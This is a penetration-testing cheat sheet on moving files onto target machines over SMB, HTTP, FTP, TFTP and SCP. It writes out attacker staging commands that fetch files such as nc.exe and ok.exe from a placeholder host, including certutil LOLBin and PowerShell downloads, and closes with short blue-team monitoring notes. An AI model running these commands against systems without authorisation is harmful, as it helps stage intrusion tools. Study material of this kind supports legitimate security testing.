# 📦 File Transfer Techniques 

> **GitHub-ready notes** for transferring files during penetration testing (SMB, HTTP, FTP, TFTP, SCP) across Linux & Windows targets.

---

## SMB File Transfer

### 🛠️ Setup SMB Server (Linux)

```bash
impacket-smbserver share . -smb2support -user user -password teste321
```

### 📥 Transfer File (Windows Victim)

```cmd
net use \\<SMB_SERVER_IP>\share /USER:user teste321
copy \\<SMB_SERVER_IP>\share\nc.exe .
```

---

## HTTP File Transfer

### 🛠️ Start Web Server (Attacker)

```bash
python -m SimpleHTTPServer 80
# or
python3 -m http.server 80
# or
service apache2 start
```

---

### 📥 Windows – File Download Methods

#### PowerShell WebClient

```powershell
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://<IP>/file.exe','C:\Users\user\Desktop\file.exe')"
```

#### PowerShell Invoke-WebRequest

```powershell
iwr -uri http://<IP>/file -OutFile file
```

#### Wget

```cmd
wget http://<IP>/file -O file
```

#### Curl

```cmd
curl http://<IP>/file -o file
```

#### Certutil (LOLBin)

```cmd
certutil -urlcache -f http://<IP>:803/ok.exe ok.exe
```

---

### 📥 Linux – File Download

```bash
wget http://<IP>/file
curl http://<IP>/file -o file
```

---

## FTP File Transfer (Pure-FTPd)

### 🛠️ Install & Configure Pure-FTPd

```bash
sudo apt update && sudo apt install pure-ftpd
sudo groupadd ftpgroup
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
sudo pure-pw useradd offsec -u ftpuser -d /ftphome
sudo pure-pw mkdb
cd /etc/pure-ftpd/auth/
sudo ln -s ../conf/PureDB 60pdb
sudo mkdir -p /ftphome
sudo chown -R ftpuser:ftpgroup /ftphome/
sudo systemctl restart pure-ftpd
```

---

### 📥 Transfer File via FTP Script (Windows)

```cmd
echo open <IP> 21 > ftp.txt
echo USER user >> ftp.txt
echo password >> ftp.txt
echo bin >> ftp.txt
echo GET nc.exe >> ftp.txt
echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
```

---

## TFTP (Trivial File Transfer Protocol)

### 🛠️ Install & Configure TFTP Server

```bash
sudo apt update && sudo apt install atftp
sudo mkdir /tftp
sudo chown nobody: /tftp
sudo atftpd --daemon --port 69 /tftp
```

### 📥 Transfer File

```cmd
tftp -i <IP> get file
```

---

## SCP (Secure Copy Protocol)

### 📤 Upload File (Linux → Linux)

```bash
scp file <user>@<IP>:/home/user/
```

### 📥 Download File

```bash
scp <user>@<IP>:/home/user/file .
```

---

## 🛡️ Defensive Notes (Blue Team)

* Monitor outbound connections
* Restrict SMB anonymous access
* Disable unused services (FTP/TFTP)
* Inspect LOLBins usage (certutil, mshta)
* EDR + network logging

---

✅ **End of File Transfer Cheat Sheet**
